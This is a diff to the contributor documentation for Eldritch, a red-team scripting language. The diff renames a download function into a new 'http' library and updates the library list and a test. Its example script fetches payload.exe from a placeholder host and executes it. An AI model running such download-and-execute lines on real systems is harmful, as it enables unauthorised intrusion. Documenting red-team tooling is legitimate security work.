@@ -15,7 +15,7 @@ Eldritch is a Pythonic DSL for Red Team engagements. Eldritch is intended to pro
 The Eldritch tome could look like this:
 
 ```python
-file.download("http://fileserver.net/payload.exe", "C:/temp/")
+http.download("http://fileserver.net/payload.exe", "C:/temp/")
 sys.exec("C:/temp/payload.exe")
 ```
 
@@ -33,13 +33,16 @@ Want to contribute to Eldritch but aren't sure what to build check our ["good fi
 `docs/_docs/user-guide/eldritch.md`
 Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch Library.
 
-Currently Eldritch has eight libraries your function can be bound to:
+Currently Eldritch has the following libraries your function can be bound to:
 
 * `assets`: Is used to interact with files stored natively in the agent.
 * `crypto` Is used to encrypt/decrypt or hash data.
 * `file`: Is used for any on disk file processing.
+* `http`: Is used for any web requests needed to be made.
 * `pivot`: Is used to migrate to identify, and migrate between systems. The pivot library is also responsible for facilitating connectivity within an environment.
 * `process`: Is used to manage running processes on a system.
+* `random` - Used to generate cryptographically secure random values.
+* `regex`: Is used to preform regex operations on strings.
 * `report`: Is used to report structured data to the caller of the eldritch environment (e.g. to the c2).
 * `sys`: Is used to check system specific configurations and start new processes.
 * `time`: Is used for obtaining and formatting time or adding delays into code.
@@ -170,7 +173,7 @@ Lastly, you'll need to add your new function to the `eldritch/runtime.rs` integr
             file_names: Vec::new(),
         },
         // Add the name of your function to this list, in alphabetical order
-        want_output: String::from(r#"["append", "compress", "copy", "download", "exists", "find", "follow", "is_dir", "is_file", "list", "mkdir", "moveto", "read", "remove", "replace", "replace_all", "template", "timestomp", "write"]"#),
+        want_output: String::from(r#"["append", "compress", "copy", "exists", "find", "follow", "is_dir", "is_file", "list", "mkdir", "moveto", "read", "remove", "replace", "replace_all", "template", "timestomp", "write"]"#),
         want_error: None,
     }
 ```
